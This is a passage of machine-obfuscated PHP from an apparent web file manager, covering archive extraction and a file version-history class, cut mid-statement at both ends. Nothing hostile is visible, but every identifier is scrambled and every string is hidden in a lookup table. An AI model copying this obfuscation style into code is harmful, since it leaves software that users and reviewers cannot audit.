Hook::trigger($±üÌ“Ã[1246], $Åµù£ó); recursion_dir($Åµù£ó, $·×´Ìà©, $¤˜¤êØ“, 0); $Œ€§ãîğ = array_merge($·×´Ìà©, $¤˜¤êØ“); $ıõƒ¢² = array(); foreach ($Œ€§ãîğ as $Şì³À–) { $ ÍÈç ¾ = IO::move(self::iconvApp($Şì³À–), $úî–ì, $Œ™şß©š); if ($ ÍÈç ¾) { $ıõƒ¢²[] = $ ÍÈç ¾; } } del_dir($Åµù£ó); } else { $ ÍÈç ¾ = IO::move($åÃŒï¿[$±üÌ“Ã[214]], $úî–ì, $Œ™şß©š, get_path_this($‚ìŠÁú²[$±üÌ“Ã[32]])); if ($ ÍÈç ¾) { $ıõƒ¢²[] = $ ÍÈç ¾; } } return $ıõƒ¢² ? $ıõƒ¢² : !1; } public static function unzipList($§Éë¿Îñ) { $ÚºÒ‰¯ =& $_SERVER[çâ¥×ø³]; $™ÈÚÆ„ = isset($§Éë¿Îñ[$ÚºÒ‰¯[1247]]) ? $§Éë¿Îñ[$ÚºÒ‰¯[1247]] : !1; $™ª›ó¬¦ = isset($§Éë¿Îñ[$ÚºÒ‰¯[1243]]) ? @json_decode($§Éë¿Îñ[$ÚºÒ‰¯[1243]], !0) : -1; $¿©ÒºÕ½ = self::unzipPart($§Éë¿Îñ[$ÚºÒ‰¯[84]], $™ª›ó¬¦); if (!$¿©ÒºÕ½ || !IO::exist($¿©ÒºÕ½[$ÚºÒ‰¯[214]])) { show_json(LNG($ÚºÒ‰¯[105]), !1); } $Ø«Öµ› = $¿©ÒºÕ½[$ÚºÒ‰¯[1242]][count($¿©ÒºÕ½[$ÚºÒ‰¯[1242]]) - 1]; $ËÈ‚Á™ = in_array(IO::ext($¿©ÒºÕ½[$ÚºÒ‰¯[214]]), array($ÚºÒ‰¯[357], $ÚºÒ‰¯[1248], $ÚºÒ‰¯[1249], $ÚºÒ‰¯[1250], $ÚºÒ‰¯[1251], $ÚºÒ‰¯[1252])); if (!$™ÈÚÆ„ && ($Ø«Öµ›[$ÚºÒ‰¯[1243]] == -1 || $ËÈ‚Á™)) { $Ğ§ø¾¸İ = $¿©ÒºÕ½[$ÚºÒ‰¯[1244]] . get_path_this($¿©ÒºÕ½[$ÚºÒ‰¯[214]]) . $ÚºÒ‰¯[1253]; if (!IO::exist($Ğ§ø¾¸İ)) { $¶”«ªĞ = $Ø«Öµ›[$ÚºÒ‰¯[1243]] == -1 ? get_path_ext(IO::pathThis($§Éë¿Îñ[$ÚºÒ‰¯[84]])) : get_path_ext($¿©ÒºÕ½[$ÚºÒ‰¯[214]]); $Í¼öªğ· = KodArchive::listContent(self::iconvSystem($¿©ÒºÕ½[$ÚºÒ‰¯[214]]), !0, $¶”«ªĞ); self::unzipErrorCheck($Í¼öªğ·, array($ÚºÒ‰¯[1254], $§Éë¿Îñ, $¿©ÒºÕ½)); @file_put_contents($Ğ§ø¾¸İ, json_encode($Í¼öªğ·[$ÚºÒ‰¯[1255]])); } return @json_decode(IO::getContent($Ğ§ø¾¸İ), !0); } IO::fileOut($¿©ÒºÕ½[$ÚºÒ‰¯[214]], $™ÈÚÆ„, get_path_this($Ø«Öµ›[$ÚºÒ‰¯[32]])); die; } private static function zipFileList($ğ§ÇÂìÁ, $ì¥¼ó²â = false) { $“Ïùè×˜ =& $_SERVER[çâ¥×ø³]; $™åÖÒ†– = array(); foreach ($ğ§ÇÂìÁ as $”È÷¼ˆ€) { $…‰œıˆ = $”È÷¼ˆ€[$“Ïùè×˜[84]]; if ($ì¥¼ó²â) { $…‰œıˆ = self::copy($”È÷¼ˆ€[$“Ïùè×˜[84]], $ì¥¼ó²â, $“Ïùè×˜[867]); } else { $›æ×şÅ¹ = self::init($”È÷¼ˆ€[$“Ïùè×˜[84]]); if ($›æ×şÅ¹->getType() == $“Ïùè×˜[106]) { $…‰œıˆ = $›æ×şÅ¹->path; } } if ($…‰œıˆ && self::local()->exist($…‰œıˆ)) { $™åÖÒ†–[$”È÷¼ˆ€[$“Ïùè×˜[84]]] = $…‰œıˆ; } } if (!empty($™åÖÒ†–)) { return array_values($™åÖÒ†–); } show_json(LNG($“Ïùè×˜[1218]), !1); } private static function localFilePath($ÔòÖ¼—À) { $˜Ç¬ÖÙ™ =& $_SERVER[çâ¥×ø³]; $¬Ï¬©²£ = KodIO::parse($ÔòÖ¼—À); if ($¬Ï¬©²£[$˜Ç¬ÖÙ™[33]] == KodIO::KOD_SOURCE) { $‡Äü´Ú = Model($˜Ç¬ÖÙ™[874])->fileInfoGet(KodIO::sourceID($ÔòÖ¼—À)); if (!$‡Äü´Ú[$˜Ç¬ÖÙ™[84]]) { show_json($˜Ç¬ÖÙ™[1256], !1); } $ÔòÖ¼—À = $‡Äü´Ú[$˜Ç¬ÖÙ™[84]]; } $¸„ÆÆšÌ = self::init($ÔòÖ¼—À); if ($¸„ÆÆšÌ->pathParse[$˜Ç¬ÖÙ™[1204]]) { $ÔòÖ¼—À = $¸„ÆÆšÌ->pathParse[$˜Ç¬ÖÙ™[1204]]; $¸„ÆÆšÌ = self::init($ÔòÖ¼—À); } $ÔãÙ¾š = $¸„ÆÆšÌ->getType(); if ($ÔãÙ¾š == $˜Ç¬ÖÙ™[106] || $ÔãÙ¾š == $˜Ç¬ÖÙ™[1257]) { if (!$¸„ÆÆšÌ->exist($¸„ÆÆšÌ->path)) { show_json(LNG($˜Ç¬ÖÙ™[105]), !1); } return $¸„ÆÆšÌ->path; } return !1; } public static function unzipPart($¢Ëö–’, $ğÕÛ‘é¦ = -1) { $¡»™·äÑ =& $_SERVER[çâ¥×ø³]; $“ÒˆÜÍÁ = IO::pathThis($¢Ëö–’); if (!$ğÕÛ‘é¦ || $ğÕÛ‘é¦ == -1) { $ò¡÷ÁÑ = array(array($¡»™·äÑ[32] => $“ÒˆÜÍÁ, $¡»™·äÑ[1243] => -1)); $ò¡÷ÁÑ[0][$¡»™·äÑ[1258]] = $ò¡÷ÁÑ[0][$¡»™·äÑ[32]]; } else { if (is_array($ğÕÛ‘é¦)) { $ò¡÷ÁÑ = $ğÕÛ‘é¦; $Í‚°ÃÕ‘ = count($ò¡÷ÁÑ) - 1; for ($ÄÖô€› = 0; $ÄÖô€› <= $Í‚°ÃÕ‘; $ÄÖô€›++) { $‘÷’ó€ô = $ò¡÷ÁÑ[$ÄÖô€›]; $úƒ·ú = get_path_this($‘÷’ó€ô[$¡»™·äÑ[32]]) . (checkExtSafe($‘÷’ó€ô[$¡»™·äÑ[32]]) ? $¡»™·äÑ[12] : $¡»™·äÑ[1259]); $ò¡÷ÁÑ[$ÄÖô€›][$¡»™·äÑ[1258]] = $¡»™·äÑ[1260] . intval($‘÷’ó€ô[$¡»™·äÑ[1243]]) . $¡»™·äÑ[430] . $úƒ·ú; if ($ÄÖô€› == 0) { continue; } $ò¡÷ÁÑ[$ÄÖô€›][$¡»™·äÑ[1258]] = $ò¡÷ÁÑ[$ÄÖô€› - 1][$¡»™·äÑ[1258]] . $¡»™·äÑ[1261] . $ò¡÷ÁÑ[$ÄÖô€›][$¡»™·äÑ[1258]]; } } } if (!is_array($ò¡÷ÁÑ) || count($ò¡÷ÁÑ) == 0) { return !1; } $ é†ƒë³ = $ò¡÷ÁÑ[count($ò¡÷ÁÑ) - 1]; if (!IO::exist($¢Ëö–’)) { return !1; } $ÅõÕœÔó = TEMP_FILES . $¡»™·äÑ[1262] . kodIO::hashPathSafe($¢Ëö–’) . $¡»™·äÑ[8]; $¶İ»¦ÕÌ = $ÅõÕœÔó . $ é†ƒë³[$¡»™·äÑ[1258]]; mk_dir($ÅõÕœÔó); file_put_contents(TEMP_FILES . $¡»™·äÑ[1237], $¡»™·äÑ[12]); if (IO::exist($¶İ»¦ÕÌ)) { return array($¡»™·äÑ[214] => $¶İ»¦ÕÌ, $¡»™·äÑ[1242] => $ò¡÷ÁÑ, $¡»™·äÑ[1244] => $ÅõÕœÔó); } $µÁä„èÙ = self::localFilePath($¢Ëö–’); if (!$µÁä„èÙ) { $µÁä„èÙ = $ÅõÕœÔó . $¡»™·äÑ[1263]; if (!IO::exist($µÁä„èÙ)) { self::copy($¢Ëö–’, $ÅõÕœÔó, !1, get_path_this($µÁä„èÙ)); } } if (!$µÁä„èÙ || !IO::exist($µÁä„èÙ)) { return !1; } if ($ é†ƒë³[$¡»™·äÑ[1243]] == -1) { return array($¡»™·äÑ[214] => $µÁä„èÙ, $¡»™·äÑ[1242] => $ò¡÷ÁÑ, $¡»™·äÑ[1244] => $ÅõÕœÔó); } $‰ñ¶»ÏÉ = $µÁä„èÙ; foreach ($ò¡÷ÁÑ as $ÄÖô€› => $‘÷’ó€ô) { if (!$‘÷’ó€ô || $‘÷’ó€ô[$¡»™·äÑ[1243]] == $¡»™·äÑ[1241]) { break; } if (substr($‘÷’ó€ô[$¡»™·äÑ[32]], -1, 1) == $¡»™·äÑ[8]) { break; } $‚«Ê„«Ã = in_array(get_path_ext($‘÷’ó€ô[$¡»™·äÑ[1258]]), array($¡»™·äÑ[357], $¡»™·äÑ[1248], $¡»™·äÑ[1249], $¡»™·äÑ[1250], $¡»™·äÑ[1251], $¡»™·äÑ[1252])); $Ò…Àúºü = $ÄÖô€› == count($ò¡÷ÁÑ) - 1 && $‚«Ê„«Ã; $À‰‚Ğé€ = $ÅõÕœÔó . $‘÷’ó€ô[$¡»™·äÑ[1258]]; $Üë¿Æ—‘ = $ÅõÕœÔó . get_path_this($‘÷’ó€ô[$¡»™·äÑ[32]]); if (IO::exist($À‰‚Ğé€)) { $‰ñ¶»ÏÉ = $À‰‚Ğé€; continue; } $‘şÎò‰„ = $ÄÖô€› == 0 ? get_path_ext($“ÒˆÜÍÁ) : get_path_ext($‰ñ¶»ÏÉ); $ÍÄŠÎÎ = KodArchive::extract(self::iconvSystem($‰ñ¶»ÏÉ), $ÅõÕœÔó, $‘÷’ó€ô[$¡»™·äÑ[1243]], $Äç¤°Ä™, $‘şÎò‰„); self::unzipErrorCheck($ÍÄŠÎÎ, array($¡»™·äÑ[1264], $¢Ëö–’, $ò¡÷ÁÑ, $‘÷’ó€ô, $À‰‚Ğé€)); if (IO::exist($Üë¿Æ—‘)) { IO::rename($Üë¿Æ—‘, get_path_this($À‰‚Ğé€)); } $‰ñ¶»ÏÉ = $À‰‚Ğé€; } $¶İ»¦ÕÌ = $‰ñ¶»ÏÉ; return array($¡»™·äÑ[214] => $‰ñ¶»ÏÉ, $¡»™·äÑ[1242] => $ò¡÷ÁÑ, $¡»™·äÑ[1244] => $ÅõÕœÔó); } private static function unzipErrorCheck($øÇ‚¹à, $“¹à»” = false) { $¤Üºµ¸ =& $_SERVER[çâ¥×ø³]; if ($øÇ‚¹à[$¤Üºµ¸[1265]]) { return !0; } write_log(array($¤Üºµ¸[1266], $øÇ‚¹à, $“¹à»”), $¤Üºµ¸[1267]); show_json($¤Üºµ¸[1268] . json_encode($øÇ‚¹à[$¤Üºµ¸[1255]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Á•‚âˆŞ =& $_SERVER[çâ¥×ø³]; $ï¢—“—Ù = $GLOBALS[$Á•‚âˆŞ[6]][$Á•‚âˆŞ[89]]; if ($ï¢—“—Ù[$Á•‚âˆŞ[1269]] != 1) { return; } if ($ï¢—“—Ù[$Á•‚âˆŞ[1270]] <= 0) { return; } if (isset($_REQUEST[$Á•‚âˆŞ[1271]]) && $_REQUEST[$Á•‚âˆŞ[1271]] == $Á•‚âˆŞ[88]) { return; } Hook::bind($Á•‚âˆŞ[1272], $Á•‚âˆŞ[1273]); Hook::bind($Á•‚âˆŞ[1274], $Á•‚âˆŞ[1275]); Hook::bind($Á•‚âˆŞ[1276], $Á•‚âˆŞ[1277]); Hook::bind($Á•‚âˆŞ[1278], $Á•‚âˆŞ[1279]); Hook::bind($Á•‚âˆŞ[1280], $Á•‚âˆŞ[1281]); Hook::bind($Á•‚âˆŞ[1282], $Á•‚âˆŞ[1283]); } public static function eventBeforeUpload($ö¬Ë„æ) { if ($ö¬Ë„æ[3] && $ö¬Ë„æ[3] != REPEAT_REPLACE) { return; } $şçñÂıÃ = self::parsePath($ö¬Ë„æ[0]); if (!$şçñÂıÃ) { return; } self::add($şçñÂıÃ); } public static function eventBeforeEdit($ïÚÃàĞñ) { $¹åÒÀ’… = self::parsePath($ïÚÃàĞñ[0]); if (!$¹åÒÀ’…) { return; } self::add($¹åÒÀ’…); } public static function eventBeforeCopyFile($ãış˜É², $´âˆå, $æö€ºˆ®, $†éë–¶˜, $÷°¶ğ“, $§¯ŠØØ) { $ ’ÇËÓÛ =& $_SERVER[çâ¥×ø³]; if (isset($æö€ºˆ®->_data[$ ’ÇËÓÛ[1208]]) && $æö€ºˆ®->_data[$ ’ÇËÓÛ[1208]]) { return; } $ŒÈİÎ² = $æö€ºˆ®->getPathOuter($†éë–¶˜); $“Òª…íÆ = self::parsePath($ŒÈİÎ²); if (!$“Òª…íÆ) { return; } self::add($“Òª…íÆ); } public static function eventBeforeRename($‹ÙŒ† ) { $©üØ¿ƒ =& $_SERVER[çâ¥×ø³]; $¼…¼¸éï = self::parsePath($‹ÙŒ† [0]); if (!$¼…¼¸éï) { return; } $€„û­¼ = self::checkInHistory($¼…¼¸éï); if (!$€„û­¼) { return; } if ($€„û­¼[$©üØ¿ƒ[33]] == $©üØ¿ƒ[214]) { $¾´’ı³ = self::listData($¼…¼¸éï); if ($¾´’ı³ && $¾´’ı³[$©üØ¿ƒ[413]]) { self::moveHistory($¼…¼¸éï, $‹ÙŒ† [1]); } } else { IO::rename($€„û­¼[$©üØ¿ƒ[84]], $‹ÙŒ† [1]); } } public static function eventBeforeMove($ØÀ‘…Ï¾) { $Õ·™ÉÈÏ =& $_SERVER[çâ¥×ø³]; $Æ„úàî× = self::parsePath($ØÀ‘…Ï¾[0]); if (!$Æ„úàî×) { return; } $›êÆ«Ûõ = self::parsePath($ØÀ‘…Ï¾[1]); if (!$›êÆ«Ûõ) { return; } $ûî®íò = $ØÀ‘…Ï¾[3]; $´İšôÇ = self::checkInHistory($Æ„úàî×); if (!$´İšôÇ) { return; } $³öİøÈ = self::pathHistory($›êÆ«Ûõ); if ($´İšôÇ[$Õ·™ÉÈÏ[33]] == $Õ·™ÉÈÏ[214]) { $³éÜª¦Ø = self::listData($Æ„úàî×); $¾½©Î¢µ = rtrim($›êÆ«Ûõ, $Õ·™ÉÈÏ[8]) . $Õ·™ÉÈÏ[8] . ($ûî®íò ? $ûî®íò : get_path_this($Æ„úàî×)); $Æ—˜ø•— = self::listData($¾½©Î¢µ); if ($³éÜª¦Ø && $³éÜª¦Ø[$Õ·™ÉÈÏ[413]] && $Æ—˜ø•— && $Æ—˜ø•—[$Õ·™ÉÈÏ[413]]) { return self::clear($Æ„úàî×); } if ($³éÜª¦Ø && $³éÜª¦Ø[$Õ·™ÉÈÏ[413]]) { self::moveHistory($Æ„úàî×, $ûî®íò, $³öİøÈ); } } else { IO::move($´İšôÇ[$Õ·™ÉÈÏ[84]], $³öİøÈ, !1, $ûî®íò); self::clearEmptyFolder(IO::pathFather($´İšôÇ[$Õ·™ÉÈÏ[84]])); } } public static function eventAfterRemove($÷¢ëŒÊ„, $í£‹—÷Ö) { $¹€°€¢´ =& $_SERVER[çâ¥×ø³]; if (!$í£‹—÷Ö) { return; } $ÔâşçŒ± = self::parsePath($÷¢ëŒÊ„[0]); if (!$ÔâşçŒ±) { return; } $Í¾³ñû¨ = self::checkInHistory($ÔâşçŒ±); if (!$Í¾³ñû¨) { return; } if ($Í¾³ñû¨[$¹€°€¢´[33]] == $¹€°€¢´[214]) { $Î€ÄäôÏ = self::listData($ÔâşçŒ±, !1); if ($Î€ÄäôÏ && $Î€ÄäôÏ[$¹€°€¢´[413]]) { self::clear($ÔâşçŒ±, !1); } } else { IO::remove($Í¾³ñû¨[$¹€°€¢´[84]]); self::clearEmptyFolder(IO::pathFather($Í¾³ñû¨[$¹€°€¢´[84]])); } } private static function checkInHistory($‡øÙ–›•) { $ñ‰ªÁ„œ = self::pathHistory($‡øÙ–›•); if (!IO::exist($ñ‰ªÁ„œ)) { $ñ‰ªÁ„œ .= $_SERVER[çâ¥×ø³][1284]; } return IO::exist($ñ‰ªÁ„œ) ? IO::info($ñ‰ªÁ„œ) : !1; } private static function parsePath($»ÑÇ¢ö) { $õõª¤Ìê =& $_SERVER[çâ¥×ø³]; if (!$»ÑÇ¢ö) { return !1; } if ($GLOBALS[$õõª¤Ìê[1285]]) { return; } $»½Œ‘€ = KodIO::parse($»ÑÇ¢ö); $ºÈ®ê“– = $»½Œ‘€[$õõª¤Ìê[33]]; $Œ£Í‰• = !$ºÈ®ê“– || $ºÈ®ê“– == KodIO::KOD_IO || $ºÈ®ê“– == KodIO::KOD_SHARE_ITEM; if (!$Œ£Í‰• || !$»½Œ‘€[$õõª¤Ìê[1286]]) { return !1; } if (substr($»ÑÇ¢ö, 0, strlen(DATA_PATH . $õõª¤Ìê[1287])) == DATA_PATH . $õõª¤Ìê[1287]) { return !1; } if ($ºÈ®ê“– == KodIO::KOD_SHARE_ITEM) { $ˆí¥¥× = IO::init($»ÑÇ¢ö); if ($ˆí¥¥×->pathParse[$õõª¤Ìê[1204]]) { return self::parsePath($ˆí¥¥×->pathParse[$õõª¤Ìê[1204]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $šÀƒ–™ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $õõª¤Ìê[1288]); foreach ($šÀƒ–™ as $™ŠıŞÀ´) { if (!$ºÈ®ê“– && substr($»ÑÇ¢ö, 0, strlen($™ŠıŞÀ´)) == $™ŠıŞÀ´) { return !1; } } self::log($GLOBALS[$õõª¤Ìê[1199]] . $õõª¤Ìê[1289] . $»ÑÇ¢ö); return $»ÑÇ¢ö; } private static function pathHistory($ÅÁ” ôË) { $ş¡„ÂõÇ =& $_SERVER[çâ¥×ø³]; $µç«‚™å = self::$_historyBase . ltrim(KodIO::clear($ÅÁ” ôË), $ş¡„ÂõÇ[8]); $µç«‚™å = str_replace(array($ş¡„ÂõÇ[1290]), array($ş¡„ÂõÇ[1291]), $µç«‚™å); return $µç«‚™å; } public static function log($—¨­×À) { } public static function historyCount($„ŒíËÇ) { $Óù…Ùƒ =& $_SERVER[çâ¥×ø³]; $Ö“¼¨ªŸ = array(); $™¦¡şä = array(); foreach ($„ŒíËÇ as $şÈººä¡) { $ÂÇ£áĞ– = get_path_father($şÈººä¡); if (!$™¦¡şä[$ÂÇ£áĞ–]) { $™¦¡şä[$ÂÇ£áĞ–] = array(); } $™¦¡şä[$ÂÇ£áĞ–][] = get_path_this($şÈººä¡); } foreach ($™¦¡şä as $ÂÇ£áĞ– => $ÆúĞäËæ) { $åÅÖÕ§’ = self::parsePath($ÂÇ£áĞ–); if (!$åÅÖÕ§’) { continue; } foreach ($ÆúĞäËæ as $‹°ÁÁ) { $‡Ãƒ¶Ö = self::listData(rtrim($åÅÖÕ§’, $Óù…Ùƒ[8]) . $Óù…Ùƒ[8] . $‹°ÁÁ, !1); if ($‡Ãƒ¶Ö && $‡Ãƒ¶Ö[$Óù…Ùƒ[413]]) { $Ö“¼¨ªŸ[rtrim($ÂÇ£áĞ–, $Óù…Ùƒ[8]) . $Óù…Ùƒ[8] . $‹°ÁÁ] = count($‡Ãƒ¶Ö[$Óù…Ùƒ[413]]); } } } return $Ö“¼¨ªŸ; } public static function add($¦‰ë…ëÚ) { $¾›Ë•²é =& $_SERVER[çâ¥×ø³]; $½Ù½›ÒÑ = self::listData($¦‰ë…ëÚ); if (!$½Ù½›ÒÑ) { return; } $š¨…·Ú· = Model($¾›Ë•²é[819])->get($¾›Ë•²é[1292]); $¼ä®¼† = $GLOBALS[$¾›Ë•²é[6]][$¾›Ë•²é[89]][$¾›Ë•²é[1270]]; $ÙèÓŞÁ¸ = $š¨…·Ú· == $¾›Ë•²é[1293] ? min(5, $¼ä®¼†) : $¼ä®¼†; if ($¼ä®¼† <= 0) { return; } $†Ş—ûÇÌ = IO::info($¦‰ë…ëÚ); $ú…È¹»ò = $½Ù½›ÒÑ[$¾›Ë•²é[413]]; if ($†Ş—ûÇÌ[$¾›Ë•²é[76]] == 0) { return; } if ($†Ş—ûÇÌ[$¾›Ë•²é[76]] >= 1024 * 1024 * 500) { return !1; } $ˆ±€ÍÚ = IO::hashSimple($¦‰ë…ëÚ); if ($ú…È¹»ò && $ú…È¹»ò[0][$¾›Ë•²é[640]] == $ˆ±€ÍÚ) { return !0; } if (array_key_exists($¾›Ë•²é[217], $†Ş—ûÇÌ) && !$†Ş—ûÇÌ[$¾›Ë•²é[217]]) { return !1; } $™ìËÆÀ = short_id(time()); $öŠãÜ„Á = array($¾›Ë•²é[443] => $™ìËÆÀ, $¾›Ë•²é[640] => $ˆ±€ÍÚ, $¾›Ë•²é[32] => $†Ş—ûÇÌ[$¾›Ë•²é[32]] . $¾›Ë•²é[10] . date($¾›Ë•²é[1294]) . rand_string(1), $¾›Ë•²é[76] => $†Ş—ûÇÌ[$¾›Ë•²é[76]], $¾›Ë•²é[495] => USER_ID, $¾›Ë•²é[215] => time(), $¾›Ë•²é[1295] => $¾›Ë•²é[12]); IO::mkdir($½Ù½›ÒÑ[$¾›Ë•²é[1296]]); $¸¢«¶¢‰ = IO::copy($¦‰ë…ëÚ, $½Ù½›ÒÑ[$¾›Ë•²é[1296]], !1, $öŠãÜ„Á[$¾›Ë•²é[32]]); if (!$¸¢«¶¢‰) { self::clearEmptyFolder($½Ù½›ÒÑ[$¾›Ë•²é[1296]]); return !1; } array_unshift($ú…È¹»ò, $öŠãÜ„Á); if (count($ú…È¹»ò) > $ÙèÓŞÁ¸) { $¾ÇÙÏ›à = array_slice($ú…È¹»ò, $ÙèÓŞÁ¸); foreach ($¾ÇÙÏ›à as $İãğµıö) { IO::remove($½Ù½›ÒÑ[$¾›Ë•²é[1296]] . $İãğµıö[$¾›Ë•²é[32]]); } $ú…È¹»ò = array_slice($ú…È¹»ò, 0, $ÙèÓŞÁ¸); } return self::saveData($½Ù½›ÒÑ[$¾›Ë•²é[1297]], $ú…È¹»ò); } public static function remove($Œº²Œ¿, $ş‘´Æ™õ) { $Ìß …œ¹ =& $_SERVER[çâ¥×ø³]; $†Ñ©‘ø² = self::listData($Œº²Œ¿); $–¾“±¯Û = array(); if (!$†Ñ©‘ø²) { return !1; } foreach ($†Ñ©‘ø²[$Ìß …œ¹[413]] as $â üÃöÜ) { if ($â üÃöÜ[$Ìß …œ¹[443]] == $ş‘´Æ™õ) { IO::remove($†Ñ©‘ø²[$Ìß …œ¹[1296]] . $â üÃöÜ[$Ìß …œ¹[32]]); continue; } $–¾“±¯Û[] = $â üÃöÜ; } return self::saveData($†Ñ©‘ø²[$Ìß …œ¹[1297]], $–¾“±¯Û); } public static function clear($º¡ĞÚâ, $ó†¾ß = true) { $İ”›àçŞ =& $_SERVER[çâ¥×ø³]; $„ö×¥ö‰ = self::listData($º¡ĞÚâ, $ó†¾ß); if (!$„ö×¥ö‰) { return !1; } foreach ($„ö×¥ö‰[$İ”›àçŞ[413]] as $ç—Ù”ô) { IO::remove($„ö×¥ö‰[$İ”›àçŞ[1296]] . $ç—Ù”ô[$İ”›àçŞ[32]]); } return self::saveData($„ö×¥ö‰[$İ”›àçŞ[1297]], array()); } public static function moveHistory($ÂÑ”©°ú, $Ö€ÅÌ¢ƒ = '', $Ü¥†Ñö = '') { $Ã›ß¶±« =& $_SERVER[çâ¥×ø³]; $›¸—úÂ„ = self::listData($ÂÑ”©°ú, !1); if (!$›¸—úÂ„ || !$›¸—úÂ„[$Ã›ß¶±«[413]]) { return !1; } $¦ğõ­¶ = $Ã›ß¶±«[1284]; $Ö€ÅÌ¢ƒ = $Ö€ÅÌ¢ƒ ? $Ö€ÅÌ¢ƒ : get_path_this($ÂÑ”©°ú); $Ü¥†Ñö = $Ü¥†Ñö ? $Ü¥†Ñö : $›¸—úÂ„[$Ã›ß¶±«[1296]]; $Â„ø¥á„ = substr(get_path_this($›¸—úÂ„[$Ã›ß¶±«[1297]]), 0, -strlen($¦ğõ­¶)); foreach ($›¸—úÂ„[$Ã›ß¶±«[413]] as $Ñôı°ªŞ => $»©üö‘¥) { $àÃçÕí = $Ö€ÅÌ¢ƒ . substr($»©üö‘¥[$Ã›ß¶±«[32]], strlen($Â„ø¥á„)); $ãûô‡Ù = IO::move($›¸—úÂ„[$Ã›ß¶±«[1296]] . $»©üö‘¥[$Ã›ß¶±«[32]], $Ü¥†Ñö, !1, $àÃçÕí); if ($ãûô‡Ù) { $›¸—úÂ„[$Ã›ß¶±«[413]][$Ñôı°ªŞ][$Ã›ß¶±«[32]] = $àÃçÕí; } } $›¸—úÂ„[$Ã›ß¶±«[1297]] = IO::move($›¸—úÂ„[$Ã›ß¶±«[1297]], $Ü¥†Ñö, !1, $Ö€ÅÌ¢ƒ . $¦ğõ­¶); self::saveData($›¸—úÂ„[$Ã›ß¶±«[1297]], $›¸—úÂ„[$Ã›ß¶±«[413]]); self::clearEmptyFolder($›¸—úÂ„[$Ã›ß¶±«[1296]]); } public static function rollback($æÇ“¯Š¹, $¬¤ÓÆá) { $ƒÓÓ„óÏ =& $_SERVER[çâ¥×ø³]; $ã×¯Î“Š = self::listData($æÇ“¯Š¹); if (!$ã×¯Î“Š) { return; } $ğñ”÷é· = IO::info($æÇ“¯Š¹); foreach ($ã×¯Î“Š[$ƒÓÓ„óÏ[413]] as $Øİ—¡Ä… => $à…ãá ¤) { if ($à…ãá ¤[$ƒÓÓ„óÏ[443]] == $¬¤ÓÆá) { self::add($æÇ“¯Š¹); $¨Í•¸á = $ã×¯Î“Š[$ƒÓÓ„óÏ[1296]] . $à…ãá ¤[$ƒÓÓ„óÏ[32]]; $âä¢–ê = IO::copy($¨Í•¸á, IO::pathFather($æÇ“¯Š¹), REPEAT_REPLACE, $ğñ”÷é·[$ƒÓÓ„óÏ[32]]); if ($âä¢–ê) { self::remove($æÇ“¯Š¹, $¬¤ÓÆá); } return $âä¢–ê; } } return !1; } public static function setDetail($‡§ã“±, $ÊÈœìˆ¼, $ï°ïÁÊª) { $çˆç«êò =& $_SERVER[çâ¥×ø³]; $’ö™çÍÃ = self::listData($‡§ã“±); if (!$’ö™çÍÃ) { return; } foreach ($’ö™çÍÃ[$çˆç«êò[413]] as $°Ô·Äó„ => $ØˆÏ›) { if ($ØˆÏ›[$çˆç«êò[443]] == $ÊÈœìˆ¼) { $’ö™çÍÃ[$çˆç«êò[413]][$°Ô·Äó„][$çˆç«êò[1295]] = $ï°ïÁÊª; self::saveData($’ö™çÍÃ[$çˆç«êò[1297]], $’ö™çÍÃ[$çˆç«êò[413]]); return !0; } } return !1; } public static function fileInfo($±âÃ§Êñ, $†ï—°½§) { $Ã¡êâÏÂ =& $_SERVER[çâ¥×ø³]; $»½¥ÅĞ¿ = self::listData($±âÃ§Êñ); if (!$»½¥ÅĞ¿) { show_json(LNG($Ã¡êâÏÂ[105]), !1); } $…Ş§¿ñœ = $Ã¡êâÏÂ[12]; foreach ($»½¥ÅĞ¿[$Ã¡êâÏÂ[413]] as $ŠåğÆ»š => $ªœØ’Â») { if ($ªœØ’Â»[$Ã¡êâÏÂ[443]] != $†ï—°½§) { continue; } $…Ş§¿ñœ = $»½¥ÅĞ¿[$Ã¡êâÏÂ[1296]] . $ªœØ’Â»[$Ã¡êâÏÂ[32]]; break; } if (!$…Ş§¿ñœ) { show_json(LNG($Ã¡êâÏÂ[105]), !1); } return IO::info($…Ş§¿ñœ); } public static function fileOut($éäşôŒ±, $„§ğîÇ‚, $ŞÜ—Ìã” = false) { $±şÚŸÕ =& $_SERVER[çâ¥×ø³]; $ñı…Ş = self::fileInfo($éäşôŒ±, $„§ğîÇ‚); $Ç„­´Í˜ =& $GLOBALS[$±şÚŸÕ[7]]; $ŞÜ—Ìã” = isset($Ç„­´Í˜[$±şÚŸÕ[1247]]) && $Ç„­´Í˜[$±şÚŸÕ[1247]] == 1; if (isset($Ç„­´Í˜[$±şÚŸÕ[33]]) && $Ç„­´Í˜[$±şÚŸÕ[33]] == $±şÚŸÕ[1298]) { return IO::fileOutImage($ñı…Ş[$±şÚŸÕ[84]], $Ç„­´Í˜[$±şÚŸÕ[1299]]); } IO::fileOut($ñı…Ş[$±şÚŸÕ[84]], $ŞÜ—Ìã”, get_path_this($éäşôŒ±)); } public static function listData($…èè§†’, $œ¢ñ¾œ = true) { $ÃË¢ëÛë =& $_SERVER[çâ¥×ø³]; if ($œ¢ñ¾œ && !IO::exist($…èè§†’)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($…èè§†’, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $£‡É›à® = self::pathHistory($…èè§†’); $¢“Ï¨Ñ‹ = array($ÃË¢ëÛë[1297] => $£‡É›à® . $ÃË¢ëÛë[1284], $ÃË¢ëÛë[1296] => rtrim(get_path_father($£‡É›à®), $ÃË¢ëÛë[8]) . $ÃË¢ëÛë[8], $ÃË¢ëÛë[413] => array()); $²Èñ¡èß = IO::getContent($¢“Ï¨Ñ‹[$ÃË¢ëÛë[1297]]); if ($²Èñ¡èß) { $²í‘®”• = json_decode($²Èñ¡èß, !0); if (is_array($²í‘®”•)) { $¢“Ï¨Ñ‹[$ÃË¢ëÛë[413]] = $²í‘®”•; } } return $¢“Ï¨Ñ‹; } private static function saveData($à˜¨‰ƒ—, $Áõ¨²Ó) { $áå’·¡ =& $_SERVER[çâ¥×ø³]; self::log($áå’·¡[1300] . $à˜¨‰ƒ— . $áå’·¡[71] . count($Áõ¨²Ó), $áå’·¡[800]); if ($Áõ¨²Ó) { return 